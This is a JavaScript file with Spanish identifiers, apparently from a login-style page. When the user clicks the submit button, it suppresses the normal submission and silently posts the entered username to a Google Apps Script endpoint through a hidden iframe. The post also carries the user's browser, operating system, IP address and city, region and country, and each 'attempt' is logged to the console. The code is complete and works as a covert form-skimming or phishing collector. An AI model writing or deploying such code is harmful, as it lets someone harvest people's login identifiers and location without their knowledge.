let geoData = {
  ip: "desconocida",
  ciudad: "",
  region: "",
  pais: ""
};

function geoCallback(data) {
  geoData.ip = data.ip || "desconocida";
  geoData.ciudad = data.city || "";
  geoData.region = data.region || "";
  geoData.pais = data.country || "";
}


<!-- ENVÍO A GOOGLE SHEETS -->
document.addEventListener("DOMContentLoaded", function () {

  const boton = document.getElementById("aceptarSubmit");
  const inputUsuario = document.getElementById("usuario");

  if (!boton || !inputUsuario) {
    console.error("Botón o campo usuario no encontrado");
    return;
  }

  function detectarNavegador() {
    const ua = navigator.userAgent;
    if (ua.includes("Edg")) return "Edge";
    if (ua.includes("Chrome")) return "Chrome";
    if (ua.includes("Firefox")) return "Firefox";
    if (ua.includes("Safari")) return "Safari";
    return "Desconocido";
  }

  function detectarSO() {
    const ua = navigator.userAgent;
    if (ua.includes("Windows")) return "Windows";
    if (ua.includes("Mac OS")) return "macOS";
    if (ua.includes("Linux")) return "Linux";
    if (ua.includes("Android")) return "Android";
    if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
    return "Desconocido";
  }

  boton.addEventListener("click", function (e) {
    e.preventDefault();

    const usuario = inputUsuario.value.trim();
    if (!usuario) {
      alert("Complete el usuario");
      return;
    }

    const navegador = detectarNavegador();
    const sistema = detectarSO();

    const form = document.createElement("form");
    form.method = "POST";
    form.action = "https://script.google.com/macros/s/AKfycbzwEP3YhvUdgIE1mrlb1Pi6ac3vkcDXskWikSavTgOxFPZI04tMakyGedRyqq5NsvA6VA/exec";
    form.target = "hidden_iframe";

    function add(name, value) {
      const input = document.createElement("input");
      input.type = "hidden";
      input.name = name;
      input.value = value;
      form.appendChild(input);
    }

    add("usuario", usuario);
    add("navegador", navegador);
    add("sistema_operativo", sistema);
    add("ip", geoData.ip);
    add("ciudad", geoData.ciudad);
    add("region", geoData.region);
    add("pais", geoData.pais);


    document.body.appendChild(form);
    form.submit();

    console.log("Intento:", usuario, navegador, sistema, geoData.ip);
  });

});